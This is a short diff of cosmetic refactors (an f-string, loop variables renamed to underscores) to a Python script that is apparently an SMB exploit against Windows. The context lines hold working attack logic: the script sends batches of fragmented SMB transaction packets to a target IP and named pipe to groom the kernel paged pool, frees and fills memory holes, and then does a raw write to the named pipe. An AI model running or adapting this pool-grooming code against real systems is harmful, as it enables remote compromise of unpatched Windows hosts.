@@ -24,7 +24,7 @@ USERNAME = ''
 PASSWORD = ''
 
 if len(sys.argv) != 3:
-	print("{} <ip> <pipe_name>".format(sys.argv[0]))
+	print(f"{sys.argv[0]} <ip> <pipe_name>")
 	sys.exit(1)
 
 target = sys.argv[1]
@@ -41,7 +41,7 @@ fid = conn.nt_create_andx(tid, pipe_name)
 
 print('Sending 50 frag packets (25 to free)')
 # paged pool size 0x8000 ... 0xc000
-for i in range(5):
+for _ in range(5):
 	for j in range(7, 0xc):
 		size = (j * 0x1000) + 0xe00
 		conn.send_trans(pack('<HH', 0x36, fid), totalDataCount=size, maxDataCount=0)
@@ -56,7 +56,7 @@ conn.disconnect_tree(tid2)
 
 print('Sending 40 padding packets')
 # fill all large holes (size >= 0x10000)
-for i in range(40):
+for _ in range(40):
 	conn.send_trans(pack('<HH', 0x36, fid), totalDataCount=0xfe80, maxDataCount=0)
 
 # Hope no hole for large paged pool left
@@ -65,7 +65,7 @@ for i in range(7):
 	mid = fid if i == 2 else None
 	reqs.append(conn.create_trans_packet(pack('<HH', 0x36, fid), mid=mid, totalDataCount=0xfe80, maxDataCount=0))
 conn.send_raw(''.join(reqs))
-for i in range(7):
+for _ in range(7):
 	conn.recvSMB()
 
 # smb write raw named pipe
